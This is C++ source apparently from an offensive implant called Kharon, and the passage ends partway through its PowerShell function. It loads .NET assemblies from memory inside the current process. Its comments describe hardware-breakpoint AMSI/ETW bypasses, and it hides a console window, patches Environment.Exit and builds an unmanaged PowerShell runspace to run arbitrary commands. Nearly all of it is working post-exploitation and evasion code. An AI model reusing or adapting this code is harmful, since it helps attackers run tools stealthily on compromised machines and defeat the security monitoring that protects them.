#include <Kharon.h>

auto DECLFN Dotnet::CreateVariantCmd(
    WCHAR* Command
) -> VARIANT {
    VARIANT var;
    Self->Oleaut32.VariantInit(&var);
    
    var.vt = VT_BSTR;                  
    var.bstrVal = Self->Oleaut32.SysAllocString( Command );
    
    return var;
}

auto DECLFN Dotnet::CreateSafeArray(
    VARIANT* Args, 
    UINT     Argc
) -> SAFEARRAY* {
    if (!Args || Argc == 0) {
        return nullptr;
    }

    SAFEARRAY* SafeArg = Self->Oleaut32.SafeArrayCreateVector( VT_VARIANT, 0, Argc );
    if ( !SafeArg ) {
        return nullptr;
    }

    for ( UINT i = 0; i < Argc; i++ ) {
        LONG index = i;
        HRESULT HResult = Self->Oleaut32.SafeArrayPutElement( SafeArg, &index, &Args[i] );
        if ( FAILED( HResult ) ) {
            Self->Oleaut32.SafeArrayDestroy(SafeArg); return nullptr;
        }
    }

    return SafeArg;
}

auto DECLFN Dotnet::GetMethodType(
    IBindingFlags  Flags,
    IType*        MType,
    BSTR          MethodInp,
    IMethodInfo** MethodReff
) -> HRESULT {
    HRESULT       HResult     = S_OK;
    SAFEARRAY*    SafeMethods = { nullptr };
    IMethodInfo** MethodsInfo = { nullptr };
    IMethodInfo*  MethodRef   = { nullptr };
    LONG lLower,  lUpper;

    HResult = MType->GetMethods( (IBindingFlags)Flags, &SafeMethods );
    if ( FAILED( HResult ) ) {
        KhDbg("[x] Failed to get methods: 0x%08X", HResult); return HResult;
    }

    Self->Oleaut32.SafeArrayGetLBound( SafeMethods, 1, &lLower );
    Self->Oleaut32.SafeArrayGetUBound( SafeMethods, 1, &lUpper );
    
    KhDbg("[+] Number of methods: %d", (lUpper - lLower + 1));

    Self->Oleaut32.SafeArrayAccessData( SafeMethods, (PVOID*)&MethodsInfo );

    for ( LONG i = lLower; i <= lUpper; i++ ) {
        BSTR MethodName = nullptr;
        MethodsInfo[i]->get_name( &MethodName );
        KhDbg( "[+] Method Name[%d]: %S", i, MethodName );
        if ( MethodName && Str::CompareW( MethodName, MethodInp ) == 0 ) {
            KhDbg("[+] Found %S method", MethodName);
            MethodRef = MethodsInfo[i];
            MethodRef->AddRef();
            Self->Oleaut32.SysFreeString( MethodName );
            break;
        }
        
        if ( MethodName ) Self->Oleaut32.SysFreeString( MethodName );
    }

    *MethodReff = MethodRef;

    return HResult;
}

auto DECLFN Dotnet::Inline(
    _In_ BYTE* AsmBytes,
    _In_ ULONG AsmLength,
    _In_ PWSTR Arguments,
    _In_ PWSTR AppDomName,
    _In_ PWSTR Version,
    _In_ BOOL  KeepLoad
) -> BOOL {
    KhDbg( "Assembly bytes at %p [%d bytes]", AsmBytes, AsmLength );
    KhDbg( "Arguments %S", Arguments );
    KhDbg( "Using app domain %S", AppDomName );
    KhDbg( "Version: %S", Version );

    PWCHAR* AsmArgv   = { nullptr };
    ULONG   AsmArgc   = { 0 };
    BOOL    Success   = FALSE;
    HANDLE  BackupOut = INVALID_HANDLE_VALUE;
    HANDLE  PipeWrite = INVALID_HANDLE_VALUE;
    HANDLE  PipeRead  = INVALID_HANDLE_VALUE;
    HWND    WinHandle = nullptr;

    SAFEARRAYBOUND SafeBound = { 0 };
    SAFEARRAY*     SafeAsm   = { nullptr };
    SAFEARRAY*     SafeExpc  = { nullptr };
    SAFEARRAY*	   SafeArgs  = { nullptr };

    CLR_CTX Context = { 0 };

    WCHAR FmVersion[MAX_PATH] = { 0 };
    ULONG FmBuffLen = MAX_PATH;

    BOOL             IsLoadable  = FALSE;
    HRESULT          HResult     = 0;
    VARIANT          VariantArgv = { 0 };
    IAssembly*       Assembly    = { nullptr };
    IAppDomain*      AppDom      = { nullptr };
    IMethodInfo*     MethodInfo  = { nullptr };
    IUnknown*        AppDomThunk = { nullptr };
    IUnknown*        EnumRtm     = { nullptr };
    IEnumUnknown*    EnumUkwn    = { nullptr };
    ICLRMetaHost*    MetaHost    = { nullptr };
    ICLRRuntimeInfo* RtmInfo     = { nullptr };
    ICorRuntimeHost* RtmHost     = { 0 };

    LONG Idx = 0;

    SECURITY_ATTRIBUTES SecAttr = { 0 };

    HResult = Self->Mscoree.CLRCreateInstance( 
        Self->Dot->CLSID.CLRMetaHost, Self->Dot->IID.ICLRMetaHost, (PVOID*)&MetaHost 
    );
    if ( HResult || !MetaHost ) goto _KH_END;

    //
    //  get the last version if parameters is not passed
    //
    if ( ( Str::CompareW( Version, L"v0.0.00000" ) == 0 ) ) {
        HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
        if ( HResult ) goto _KH_END;

        while ( EnumUkwn->Next( 1, &EnumRtm, 0 ) == S_OK) {
            if ( !EnumRtm ) continue;
    
            if ( SUCCEEDED( EnumRtm->QueryInterface( Self->Dot->IID.ICLRRuntimeInfo, (PVOID*)&RtmInfo) ) && RtmInfo ) {
                
                if ( SUCCEEDED( RtmInfo->GetVersionString( FmVersion, &FmBuffLen ) ) ) {
                    Version = FmVersion;
                    KhDbg("supported version: %S", FmVersion);
                }
            }
        }
    }

    HResult = MetaHost->GetRuntime( Version, Self->Dot->IID.ICLRRuntimeInfo, (PVOID*)&RtmInfo );
    if ( HResult ) goto _KH_END;

    //
    // check if runtime is loadable
    //
    HResult = RtmInfo->IsLoadable( &IsLoadable );
    KhDbg( "Is loadable: %s", IsLoadable ? "True" : "False" );
    if ( HResult || !IsLoadable ) goto _KH_END;

    //
    // load clr version
    //
    HResult = RtmInfo->GetInterface( 
        Self->Dot->CLSID.CorRuntimeHost, Self->Dot->IID.ICorRuntimeHost, (PVOID*)&RtmHost 
    );
    if ( HResult ) goto _KH_END;

    //
    // start the clr loaded
    //
    HResult = RtmHost->Start();
    if ( HResult ) goto _KH_END;

    //
    // Patch Exit routine
    //
    if ( this->ExitBp ) {
        this->PatchExit( RtmHost );
    }

    //
    // create the app domain
    //
    HResult = RtmHost->CreateDomain( AppDomName, 0, &AppDomThunk );
    if ( HResult ) goto _KH_END;

    HResult = AppDomThunk->QueryInterface( this->IID.AppDomain, (PVOID*)&AppDom );
    if ( HResult ) goto _KH_END;

    SafeBound = { AsmLength, 0 };
    SafeAsm   = Self->Oleaut32.SafeArrayCreate( VT_UI1, 1, &SafeBound );

    //
    // copy the dotnet assembly to safe array
    //
    Mem::Copy( SafeAsm->pvData, AsmBytes, AsmLength );

    //
    // active hwbp to bypass amsi/etw
    //
    if ( Self->Hw->DotnetBypass ) {
        Self->Hw->DotnetInit();
    }

    //
    // load the dotnet
    //
    HResult = AppDom->Load_3( SafeAsm, &Assembly );
    if ( HResult ) goto _KH_END;

    //
    // get the entry point
    //
    HResult = Assembly->get_EntryPoint( &MethodInfo );
    if ( HResult ) goto _KH_END;

    //
    // get the parameters requirements
    //
    HResult = MethodInfo->GetParameters( &SafeExpc );
    if ( HResult ) goto _KH_END;

    //
    // work with parameters requirements and do it
    //
	if ( SafeExpc ) {
		if ( SafeExpc->cDims && SafeExpc->rgsabound[0].cElements ) {
			SafeArgs = Self->Oleaut32.SafeArrayCreateVector( VT_VARIANT, 0, 1 );

			if ( Arguments ) {
                if ( Str::LengthW( Arguments ) ) {
                    AsmArgv = Self->Shell32.CommandLineToArgvW( Arguments, (PINT)&AsmArgc );
                }
			}

			VariantArgv.parray = Self->Oleaut32.SafeArrayCreateVector( VT_BSTR, 0, AsmArgc );
			VariantArgv.vt     = ( VT_ARRAY | VT_BSTR );

			for ( Idx = 0; Idx < AsmArgc; Idx++ ) {
				Self->Oleaut32.SafeArrayPutElement( VariantArgv.parray, &Idx, Self->Oleaut32.SysAllocString( AsmArgv[Idx] ) );
			}

			Idx = 0;
			Self->Oleaut32.SafeArrayPutElement( SafeArgs, &Idx, &VariantArgv );
			Self->Oleaut32.SafeArrayDestroy( VariantArgv.parray );
		}
	}

    //
    // set the output console
    //

    SecAttr = { sizeof( SECURITY_ATTRIBUTES ), nullptr, TRUE };

    Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecAttr, PIPE_BUFFER_LENGTH );

    WinHandle = Self->Krnl32.GetConsoleWindow();

    if ( !WinHandle ) {
        Self->Krnl32.AllocConsole();

        if ( ( WinHandle = Self->Krnl32.GetConsoleWindow() ) ) {
            Self->User32.ShowWindow( WinHandle, SW_HIDE );
        }
    }

    BackupOut = Self->Krnl32.GetStdHandle( STD_OUTPUT_HANDLE );
    Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, PipeWrite );

    KhDbg( "invoking .NET assembly" );

    //
    // invoke/execute the dotnet assembly
    //
    HResult = MethodInfo->Invoke_3( VARIANT(), SafeArgs, nullptr );
    if ( HResult ) goto _KH_END;

    //
    // desactive hwbp to bypass amsi/etw
    //
    if ( Self->Hw->DotnetBypass ) {
        Self->Hw->DotnetExit();
    }

    //
    // allocate memory to output buffer
    //
    Self->Dot->Out.p = (CHAR*)Self->Hp->Alloc( PIPE_BUFFER_LENGTH );

    KhDbg( "start read output of the assembly" );

    //
    // read the output
    //
    Success = Self->Krnl32.ReadFile( PipeRead, Self->Dot->Out.p, PIPE_BUFFER_LENGTH, &Self->Dot->Out.s, nullptr );

    KhDbg( "dotnet asm output [%d bytes] %s", Self->Dot->Out.s, Self->Dot->Out.p );
_KH_END:
    if ( HResult ) {    
        LPSTR errorMessage = nullptr;
        DWORD flags = 
            FORMAT_MESSAGE_ALLOCATE_BUFFER | 
            FORMAT_MESSAGE_FROM_SYSTEM | 
            FORMAT_MESSAGE_IGNORE_INSERTS;
    
        DWORD result = Self->Krnl32.FormatMessageA(
            flags, nullptr, HResult,MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPSTR)&errorMessage, 0, nullptr
        );
    
        if ( result > 0 && errorMessage != nullptr ) {
            KhDbg("Erro (HRESULT 0x%08X): %s\n", HResult, errorMessage);
        }
    
        if ( errorMessage != nullptr ) {
            // Self->Hp->Free( errorMessage );
        }
    }

    if ( BackupOut ) Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, BackupOut );

    if ( Self->Krnl32.GetConsoleWindow() ) Self->Krnl32.FreeConsole();

    if ( AsmArgv ) {
        Self->Hp->Free( AsmArgv ); AsmArgv = nullptr;
    }

    if ( SafeAsm ) {
        Self->Oleaut32.SafeArrayDestroy( SafeAsm ); SafeAsm = nullptr;
    }

    if ( SafeArgs ) {
        Self->Oleaut32.SafeArrayDestroy( SafeArgs ); SafeArgs = nullptr;
    }

    if ( MethodInfo ) {
        MethodInfo->Release();
    }

    if ( RtmInfo ) {
        RtmInfo->Release();
    }

    if ( !KeepLoad ) {
        RtmHost->UnloadDomain( AppDomThunk );
    } 

    if ( RtmHost ) {
        RtmHost->Release();
    }

    return HResult;
}

auto DECLFN Dotnet::VersionList( VOID ) -> VOID {

    HRESULT HResult = S_OK;

    PWCHAR FmVersion = (PWCHAR)Self->Hp->Alloc( MAX_PATH );
    ULONG  FmBuffLen = MAX_PATH;

    ICLRRuntimeInfo* RtmInfo     = { 0 };
    IUnknown*        EnumRtm     = { 0 };
    IEnumUnknown*    EnumUkwn    = { 0 };
    ICLRMetaHost*    MetaHost    = { 0 };

    //
    // host clr in the process
    //
    HResult = Self->Mscoree.CLRCreateInstance(
        Self->Dot->CLSID.CLRMetaHost, Self->Dot->IID.ICLRMetaHost, (PVOID*)&MetaHost
    );
    if ( HResult ) goto _KH_END;

    //
    //  packet the versions
    //
    HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
    if ( HResult ) goto _KH_END;

    while ( EnumUkwn->Next( 1, &EnumRtm, 0 ) == S_OK) {
        if ( !EnumRtm ) continue;

        if ( SUCCEEDED( EnumRtm->QueryInterface( Self->Dot->IID.ICLRRuntimeInfo, (PVOID*)&RtmInfo) ) && RtmInfo ) {

            if ( SUCCEEDED( RtmInfo->GetVersionString( FmVersion, &FmBuffLen ) ) ) {
                Self->Pkg->Bytes( G_PACKAGE, (PUCHAR)FmVersion, FmBuffLen );
                KhDbg("supported version: %S", FmVersion);
            }
        }
    }

_KH_END:
    if ( MetaHost ) MetaHost->Release();
    if ( EnumUkwn ) EnumUkwn->Release();
    if ( EnumRtm  ) EnumRtm->Release();
    if ( RtmInfo  ) RtmInfo->Release();

    return;
}

auto DECLFN Dotnet::GetAssemblyLoaded(
    _In_  IAppDomain* AppDomain,
    _In_  WCHAR*      AsmName1,
    _In_  GUID        AsmIID, 
    _Out_ IAssembly** Assembly
) -> HRESULT {
    HRESULT    HResult  = S_OK;
    BSTR       AsmName2 = { nullptr };
    IAssembly* AsmTmp   = { nullptr };
    IUnknown** UnkDf    = { nullptr };

    LONG lLower = 0;
    LONG lUpper = 0;

    SAFEARRAY* SafeAsms = { nullptr };

    HResult = AppDomain->GetAssemblies( &SafeAsms );
    if ( FAILED( HResult ) ) return HResult;

    Self->Oleaut32.SafeArrayGetLBound( SafeAsms, 1, &lLower );
    Self->Oleaut32.SafeArrayGetUBound( SafeAsms, 1, &lUpper );

    Self->Oleaut32.SafeArrayAccessData( SafeAsms, (PVOID*)&UnkDf );

    for ( LONG i = lLower; i <= lUpper; i++ ) {
        IUnknown* UnkTmp = UnkDf[i];
        if ( ! UnkTmp ) continue;

        AsmTmp = nullptr;
        HResult  = UnkTmp->QueryInterface( AsmIID, (PVOID*)&AsmTmp );
        if ( SUCCEEDED( HResult ) && AsmTmp ) {
            HResult = AsmTmp->get_ToString( &AsmName2 );
            if ( FAILED( HResult ) ) return HResult;

            KhDbg( "[%d] %S", i, AsmName2 );

            if ( SUCCEEDED( HResult ) && AsmName2 ) {
                if ( Str::StartsWith( (PBYTE)AsmName2, (PBYTE)AsmName1 ) ) {
                    KhDbg( "%S found", AsmName2 ); *Assembly = AsmTmp; break;
                }
            }
            
            Self->Oleaut32.SysFreeString( AsmName2 );
        }

        UnkTmp->Release();
    }

    return HResult;
}

auto DECLFN Dotnet::PatchExit(
    _In_ ICorRuntimeHost* IRuntime
) -> HRESULT {
    HRESULT     HResult       = S_OK;

    IAppDomain* AppDomain     = { nullptr };
    IAssembly*  Mscorlib      = { nullptr };
    IUnknown*   AppDomUnknown = { nullptr };

    SAFEARRAY* SafeEmpty = { nullptr };

    IPropertyInfo* MtdHandleProp = { nullptr };
    IType*         SysEnvClass   = { nullptr };
    IType*         ReflectClass  = { nullptr };
    IType*         RtmMethod     = { nullptr };

    IMethodInfo*  ExitMethod   = { nullptr };
    IMethodInfo*  GetFncMethod = { nullptr };
    IBindingFlags BindFlags_1  = (IBindingFlags)( IBindingFlags::BindingFlags_Instance | IBindingFlags::BindingFlags_Public );
    IBindingFlags ExitFlags    = (IBindingFlags)( IBindingFlags::BindingFlags_Public | IBindingFlags::BindingFlags_Static );

    VARIANT VarExitPtr   = { 0 };
    VARIANT VarMethodPtr = { 0 };
    VARIANT VarMethodVal = { 0 };

    BSTR AsmName     = { nullptr };
    BSTR MHandleBstr  = Self->Oleaut32.SysAllocString( L"MethodHandle" );
    BSTR ReflBstr     = Self->Oleaut32.SysAllocString( L"System.Reflection.MethodInfo" );
    BSTR GetFncBstr   = Self->Oleaut32.SysAllocString( L"GetFunctionPointer" );
    BSTR RtmBstr      = Self->Oleaut32.SysAllocString( L"System.RuntimeMethodHandle" );
    BSTR SysEnvBstr   = Self->Oleaut32.SysAllocString( L"System.Environment" );
    BSTR ExitBstr     = Self->Oleaut32.SysAllocString( L"Exit" );

    HResult = IRuntime->GetDefaultDomain( (IUnknown**)&AppDomUnknown );
    if ( FAILED( HResult ) ) goto _KH_END;

    HResult = AppDomUnknown->QueryInterface( Self->Dot->IID.AppDomain, (PVOID*)&AppDomain );
    if ( FAILED( HResult ) ) goto _KH_END;

    HResult = this->GetAssemblyLoaded( AppDomain, L"mscorlib", this->IID.MscorlibAsm, &Mscorlib );
    if ( FAILED( HResult ) ) goto _KH_END;

    HResult = Mscorlib->GetType_2( ReflBstr, &ReflectClass );
    if ( FAILED( HResult ) ) goto _KH_END;

    HResult = Mscorlib->GetType_2( SysEnvBstr, &SysEnvClass );
    if ( FAILED( HResult ) ) goto _KH_END;

    HResult = Mscorlib->GetType_2( RtmBstr, &RtmMethod );
    if ( FAILED( HResult ) ) goto _KH_END;
    
    HResult = ReflectClass->GetProperty( MHandleBstr, BindFlags_1, &MtdHandleProp );
    if ( FAILED( HResult ) ) goto _KH_END;

    HResult = SysEnvClass->GetMethod_2( ExitBstr, ExitFlags, &ExitMethod );
    if ( FAILED( HResult ) ) goto _KH_END;

    HResult = RtmMethod->GetMethod_2( GetFncBstr, BindFlags_1, &GetFncMethod );
    if ( FAILED( HResult ) ) goto _KH_END;

    SafeEmpty = Self->Oleaut32.SafeArrayCreateVector( VT_EMPTY, 0, 0 );

    VarMethodPtr.vt      = VT_UNKNOWN;
    VarMethodPtr.punkVal = ExitMethod;

    HResult = MtdHandleProp->GetValue( VarMethodPtr, SafeEmpty, &VarMethodVal );
    if ( FAILED( HResult ) ) goto _KH_END;

    HResult = GetFncMethod->Invoke_3( VarMethodVal, SafeEmpty, &VarExitPtr );
    if ( FAILED( HResult ) ) goto _KH_END;

    KhDbg( "System.Environment.Exit at %p", VarExitPtr.byref );

_KH_END:
    if ( MHandleBstr ) Self->Oleaut32.SysFreeString( MHandleBstr );
    if ( ReflBstr    ) Self->Oleaut32.SysFreeString( ReflBstr );
    if ( GetFncBstr  ) Self->Oleaut32.SysFreeString( GetFncBstr );
    if ( RtmBstr     ) Self->Oleaut32.SysFreeString( RtmBstr );
    if ( SysEnvBstr  ) Self->Oleaut32.SysFreeString( SysEnvBstr );
    if ( ExitBstr    ) Self->Oleaut32.SysFreeString( ExitBstr );
    if ( SafeEmpty   ) Self->Oleaut32.SafeArrayDestroy( SafeEmpty );

    // Clean up VARIANTs
    Self->Oleaut32.VariantClear( &VarExitPtr );
    Self->Oleaut32.VariantClear( &VarMethodPtr );
    Self->Oleaut32.VariantClear( &VarMethodVal );

    if ( MtdHandleProp ) MtdHandleProp->Release();
    if ( SysEnvClass   ) SysEnvClass->Release();
    if ( ReflectClass  ) ReflectClass->Release();
    if ( RtmMethod     ) RtmMethod->Release();
    if ( ExitMethod    ) ExitMethod->Release();
    if ( GetFncMethod  ) GetFncMethod->Release();
    if ( Mscorlib      ) Mscorlib->Release();
    if ( AppDomain     ) AppDomain->Release();
    if ( AppDomUnknown ) AppDomUnknown->Release();

    return HResult;
}

auto Dotnet::Pwsh(
    _In_     WCHAR* Command,
    _In_opt_ PBYTE  Script
) -> HRESULT {
    HRESULT HResult = S_OK;

    LONG lLower, lUpper;
    LONG  ArgIdx = 0;
    BYTE* Output = nullptr;
    ULONG OutLen = 0;
    BOOL  IsBl   = FALSE;

    IType* PipelineHdrType = nullptr;
    IType* CmdCollectType  = nullptr;
    IType* PipelineType    = nullptr;
    IType* RunspaceType    = nullptr;
    IType* ReflectionType  = nullptr;
    IType* RunsFactoryType = nullptr;

    IMethodInfo* AddScriptMethod      = nullptr;
    IMethodInfo* ReflectionMethod     = nullptr;
    IMethodInfo* CreateRunspace       = nullptr;
    IMethodInfo* RunsFactoryMethod    = nullptr;
    IMethodInfo* CreatePipelineMethod = nullptr;

    VARIANT VarCommands = { 0 };
    VARIANT VarPipe     = { 0 };
    VARIANT VarOutput   = { 0 };
    VARIANT VarArgv     = { 0 };
    VARIANT VarParam    = { 0 };
    VARIANT VarResult   = { 0 };

    WCHAR FmVersion[MAX_PATH] = { 0 };
    ULONG FmBuffLen = MAX_PATH;

    IBindingFlags BindFlags_1 = (IBindingFlags)( IBindingFlags::BindingFlags_NonPublic | IBindingFlags::BindingFlags_Public | IBindingFlags::BindingFlags_Static | IBindingFlags::BindingFlags_FlattenHierarchy | IBindingFlags::BindingFlags_Instance );
    IBindingFlags BindFlags_2 = (IBindingFlags)( IBindingFlags::BindingFlags_Public | IBindingFlags::BindingFlags_Static | IBindingFlags::BindingFlags_FlattenHierarchy );
    IBindingFlags BindFlags_3 = (IBindingFlags)( IBindingFlags::BindingFlags_Public | IBindingFlags::BindingFlags_Static | IBindingFlags::BindingFlags_FlattenHierarchy );

    SAFEARRAYBOUND SafeBound   = { 0 };
    SAFEARRAY*     SafePipeArg = { nullptr };
    SAFEARRAY*     SafeAsms    = { nullptr };
    SAFEARRAY*     SafeMethods = { nullptr };
    SAFEARRAY*     SafeAsm     = { nullptr };
    SAFEARRAY*     SafeExpc    = { nullptr };
    SAFEARRAY*	   SafeArgs    = { nullptr };

    IUnknown*        AppDomThunk = { nullptr };
    IUnknown*        EnumRtm     = { nullptr };
    IEnumUnknown*    EnumUkwn    = { nullptr };
    IAssembly*       Automation  = { nullptr };
    IAssembly*       Mscorlib    = { nullptr }; 
    IAppDomain*      AppDom      = { nullptr };
    ICLRMetaHost*    MetaHost    = { nullptr };
    ICLRRuntimeInfo* RtmInfo     = { nullptr };
    ICorRuntimeHost* RtmHost     = { nullptr };

    BSTR PipelineHdrBstr    = Self->Oleaut32.SysAllocString( L"InvokeAsync" );
    BSTR GetOutBstr         = Self->Oleaut32.SysAllocString( L"InvokeAsync" );
    BSTR InvokeAsyncBstr    = Self->Oleaut32.SysAllocString( L"InvokeAsync" );
    BSTR AddScriptBstr      = Self->Oleaut32.SysAllocString( L"AddScript" );
    BSTR CmdCollectBstr     = Self->Oleaut32.SysAllocString( L"System.Management.Automation.Runspaces.CommandCollection" );
    BSTR GetCmdBstr         = Self->Oleaut32.SysAllocString( L"get_Commands" );
    BSTR PipelineBstr       = Self->Oleaut32.SysAllocString( L"System.Management.Automation.Runspaces.Pipeline" );
    BSTR CreateRunspaceBstr = Self->Oleaut32.SysAllocString( L"CreateRunspace" );
    BSTR RunspaceFactBstr   = Self->Oleaut32.SysAllocString( L"System.Management.Automation.Runspaces.RunspaceFactory" );
    BSTR ReflectAsmBstr     = Self->Oleaut32.SysAllocString( L"System.Reflection.Assembly" );
    BSTR LoadPartNameBstr   = Self->Oleaut32.SysAllocString( L"LoadWithPartialName" );
    BSTR OpenBstr           = Self->Oleaut32.SysAllocString( L"Open" );
    BSTR CreatePipelineBstr = Self->Oleaut32.SysAllocString( L"CreatePipeline" );
    BSTR SysManBstr         = Self->Oleaut32.SysAllocString( L"System.Management.Automation.Runspaces.Runspace" );

    HResult = Self->Mscoree.CLRCreateInstance( this->CLSID.CLRMetaHost, this->IID.ICLRMetaHost, (VOID**)&MetaHost );
    if ( FAILED( HResult ) || !MetaHost ) {
        KhDbg( "[x] failed on instance the clr: %X", HResult ); return HResult;
    }

    HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed to enumerate installed framework versions: %X", HResult ); return HResult;
    }

    while ( ( EnumUkwn->Next( 1, &EnumRtm, 0 ) == S_OK ) ) {
        if ( ! EnumRtm ) continue;

        if ( SUCCEEDED( EnumRtm->QueryInterface( this->IID.ICLRRuntimeInfo, (VOID**)&RtmInfo ) ) && RtmInfo ) {
            if ( SUCCEEDED( RtmInfo->GetVersionString( FmVersion, &FmBuffLen ) ) ) {
                KhDbg( "[+] supported version: %S", FmVersion );
            }
        }
    }

    KhDbg( "[+] using last version: %S", FmVersion );

    HResult = MetaHost->GetRuntime( FmVersion, this->IID.ICLRRuntimeInfo, (VOID**)&RtmInfo );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }

    HResult = RtmInfo->IsLoadable( &IsBl );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }

    KhDbg( "[+] is loadable: %s", IsBl ? "true" : "false"  );

    HResult = RtmInfo->GetInterface( this->CLSID.CorRuntimeHost, this->IID.ICorRuntimeHost, (VOID**)&RtmHost );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }

    HResult = RtmHost->Start();
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }

    KhDbg( "[+] started!" );

    HResult = RtmHost->GetDefaultDomain( &AppDomThunk );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }

    HResult = AppDomThunk->QueryInterface( this->IID.AppDomain, (VOID**)&AppDom );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }

    HResult = this->GetAssemblyLoaded( AppDom, L"mscorlib", this->IID.MscorlibAsm, &Mscorlib );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }

    HResult = Mscorlib->GetType_2( ReflectAsmBstr, &ReflectionType );
    if ( FAILED( HResult ) ) {
        KhDbg("[x] Failed to get System.Reflection.Assembly type: 0x%08X", HResult); return HResult;
    }

    HResult = this->GetMethodType( BindFlags_1, ReflectionType, LoadPartNameBstr, &ReflectionMethod );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }
 
    Self->Oleaut32.VariantInit( &VarParam  );
    Self->Oleaut32.VariantInit( &VarResult );

    SafeArgs = Self->Oleaut32.SafeArrayCreateVector( VT_VARIANT, 0 , 1 );

    VarParam.vt      = VT_BSTR;
    VarParam.bstrVal = Self->Oleaut32.SysAllocString( L"System.Management.Automation" );
    if ( ! VarParam.bstrVal ) return HResult;

    Self->Oleaut32.SafeArrayPutElement( SafeArgs, &ArgIdx, &VarParam );

    HResult = ReflectionMethod->Invoke_3( VARIANT(), SafeArgs, &VarResult );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }
 
    Automation = (IAssembly*)VarResult.byref;
    if ( Automation ) {
        Automation->AddRef();
    }

    HResult = Automation->GetType_2( RunspaceFactBstr, &RunsFactoryType );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }

    HResult = this->GetMethodType( BindFlags_1, RunsFactoryType, CreateRunspaceBstr, &CreateRunspace );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }

    VARIANT VarCreateRunsp = { 0 };

    HResult = CreateRunspace->Invoke_3( VARIANT(), nullptr, &VarCreateRunsp );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }

    HResult = Automation->GetType_2( SysManBstr, &RunspaceType );
    if ( FAILED( HResult ) ) {
        KhDbg("Failed to get type of Runspace: 0x%08X", HResult); return HResult;
    }

    HResult = RunspaceType->InvokeMember_3(
        OpenBstr, (IBindingFlags)(IBindingFlags::BindingFlags_NonPublic | IBindingFlags::BindingFlags_Public | IBindingFlags::BindingFlags_Instance | IBindingFlags::BindingFlags_InvokeMethod), 
        nullptr, VarCreateRunsp, nullptr, nullptr
    );
    if ( FAILED( HResult ) ) {
        KhDbg("[x] Failed to Open() runspace: 0x%08X", HResult);
        return HResult;
    }

    KhDbg( "Open invoked" );

    SafePipeArg = Self->Oleaut32.SafeArrayCreateVector( VT_VARIANT, 0, 0 );

    HResult = Automation->GetType_2( PipelineBstr, &PipelineType );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }

    HResult = this->GetMethodType( (IBindingFlags)( IBindingFlags::BindingFlags_Public | IBindingFlags::BindingFlags_Instance ), RunspaceType, CreatePipelineBstr, &CreatePipelineMethod );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }    

    HResult = CreatePipelineMethod->Invoke_3( VarCreateRunsp, nullptr, &VarPipe);
    if (FAILED(HResult)) {
        KhDbg("Failed to create pipeline: 0x%08X", HResult);
        return HResult;
    }

    // // After CreatePipelineMethod->Invoke_3
    // if (VarPipe.vt == VT_UNKNOWN || VarPipe.vt == VT_DISPATCH) {
    //     IDispatch* pDisp = nullptr;
    //     if (VarPipe.vt == VT_UNKNOWN) {
    //         HResult = VarPipe.punkVal->QueryInterface( this->IID.IDispatch, (void**)&pDisp );
    //     } else {
    //         pDisp = VarPipe.pdispVal;
    //         pDisp->AddRef(); // Keep reference if we use it
    //     }

    //     if (SUCCEEDED(HResult) && pDisp) {
    //         // Use pDisp for your operations
    //         // When done:
    //         pDisp->Release();
    //     } else {
    //         KhDbg("[x] Failed to get IDispatch from pipeline: 0x%08X", HResult);
    //         return HResult;
    //     }
    // } else {
    //     KhDbg("[x] Unexpected VarPipe type: %d", VarPipe.vt);
    //     return E_NOINTERFACE;
    // }

    auto flags = (IBindingFlags)(
        IBindingFlags::BindingFlags_NonPublic | IBindingFlags::BindingFlags_Instance |
        IBindingFlags::BindingFlags_Public | IBindingFlags::BindingFlags_InvokeMethod
    );

    HResult = PipelineType->InvokeMember_3( GetCmdBstr, flags, nullptr, VarPipe, nullptr, &VarCommands );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }   

    // if (VarCommands.vt != VT_DISPATCH || !VarCommands.pdispVal) {
    //     KhDbg("[x] VarCommands is invalid (VT=%d)", VarCommands.vt);
    //     Self->Oleaut32.SafeArrayDestroy(SafeArgs);  // Cleanup if SafeArgs was created
    //     return E_INVALIDARG;
    // }

    HResult = Automation->GetType_2( CmdCollectBstr, &CmdCollectType );
    if ( FAILED( HResult ) ) {
        KhDbg( "[x] failed: %X", HResult ); return HResult;
    }   
    
    WCHAR FinalCmd[MAX_PATH*2] = { 0 };

    Str::ConcatW( FinalCmd, Command );
    Str::ConcatW( FinalCmd, L" | Out-String" );

    VARIANT VarCmd;
    Self->Oleaut32.VariantInit(&VarCmd);
    VarCmd.vt = VT_BSTR;
    VarCmd.bstrVal = Self->Oleaut32.SysAllocString(FinalCmd); // Allocate BSTR

    SafeArgs = Self->Oleaut32.SafeArrayCreateVector(VT_VARIANT, 0, 1);
    LONG index = 0;
    Self->Oleaut32.SafeArrayPutElement(SafeArgs, &index, &VarCmd);

